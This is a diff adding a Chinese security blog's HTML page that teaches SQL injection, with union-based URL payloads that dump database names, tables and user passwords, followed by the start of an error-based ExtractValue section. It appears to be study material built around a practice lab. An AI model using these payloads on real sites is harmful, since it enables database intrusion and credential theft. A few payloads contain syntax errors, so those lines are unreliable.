@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Web安全学习之数据库注入语句的收集和学习 - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2019-10-01&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">4.1k</span>
+  
+  <h1 id="Web安全学习之数据库注入语句的收集和学习">Web安全学习之数据库注入语句的收集和学习</h1>
+<h2 id="任务目标">任务目标</h2>
+<ol>
+<li>收集网络上各种sql注入时使用的payload并理解其适用的环境（检测注入、利用注入）；</li>
+<li>记录sqlmap的检测和利用过程中使用的payload；</li>
+<li>理解以上涉及的sql语句的意思，其中会涉及不同的数据库、不同注入场景。将收集方式和学习过程整理形成报告；</li>
+<li>扩展学习：理解sqlmap自带tamper的原理</li>
+</ol>
+<h2 id="0x01-Payload收集">0x01 Payload收集</h2>
+<blockquote>
+<p>以下payloads都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p>
+</blockquote>
+<p>我们把注入场景分为：</p>
+<ul>
+<li>联合查询注入</li>
+<li>报错型注入</li>
+<li>布尔盲注</li>
+<li>时间盲注</li>
+</ul>
+<h3 id="联合查询注入">联合查询注入</h3>
+<h4 id="使用场景">使用场景</h4>
+<p>页面上有显示位</p>
+<blockquote>
+<p>什么是显示位： 在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位 。</p>
+</blockquote>
+<h4 id="Payload">Payload</h4>
+<ol>
+<li>
+<p>判断当前数据表中有几列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看显示位在第几列（假设一共三列）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：这里必须是查询一个不存在的记录才能起作用。</p>
+</blockquote>
+</li>
+<li>
+<p>显示当前数据库（假设显示位中包含第三位）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看当前数据库中的所有表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>函数<code>group_concat()</code>把所有结果都在一行输出</p>
+</blockquote>
+</li>
+<li>
+<p>查询所有数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询某个数据库中的表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询某个表中的所有字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询某个表中的字段内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0x3a会被转义位冒号<code>：</code></p>
+</blockquote>
+</li>
+</ol>
+<h2 id="报错型注入">报错型注入</h2>
+<h3 id="使用场景-v2">使用场景</h3>
+<p>页面上没有显示位但是有sql语句执行错误信息输出。</p>
+<h4 id="Payload-v2">Payload</h4>
+<p>主要有三种SQL注入报错方式：</p>
+<ul>
+<li>ExtractValue</li>
+<li>UpdateXml</li>
+<li>floor</li>
+</ul>
+<h5 id="ExtractValue">ExtractValue</h5>
+<p>首先来看<code>ExtractValue()</code>函数，它接受两个字符串参数，第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。 例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, &#39;~&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~&#39;</span><br></pre></td></tr></table></figure>
+<p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
